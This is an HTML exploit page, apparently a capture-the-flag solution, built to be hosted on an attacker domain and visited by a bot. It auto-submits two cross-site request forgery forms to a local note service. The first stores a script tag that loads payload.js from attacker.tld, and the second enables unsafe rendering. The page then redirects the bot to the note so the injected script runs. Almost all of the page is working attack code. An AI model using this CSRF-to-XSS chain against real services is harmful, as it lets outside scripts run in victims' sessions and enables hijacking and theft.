<!-- save as attacker.html and host it on e.g. https://attacker.tld/pwn -->
<!doctype html>
<html>
<body>
<!-- 1. CSRF: make the bot create a malicious note -->
<form id="n" action="http://127.0.0.1:7189/dashboard" method="POST">
  <input type="hidden" name="content"
  value='<script src="https://attacker.tld/payload.js"></script>'>
</form>

<!-- 2. CSRF: turn on “unsafe” rendering -->
<form id="u" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
  <input type="hidden" name="id" value="2"> <!-- our note’s id -->
  <input type="hidden" name="enable" value="1">
</form>

<script>
n.submit();               // create the XSS note   (#2)
setTimeout(() => { u.submit(); }, 600);           // enable unsafe mode
setTimeout(() => {
  location = 'http://127.0.0.1:7189/notes/2';     // view it → XSS fires
}, 1200);
</script>
</body>
</html>
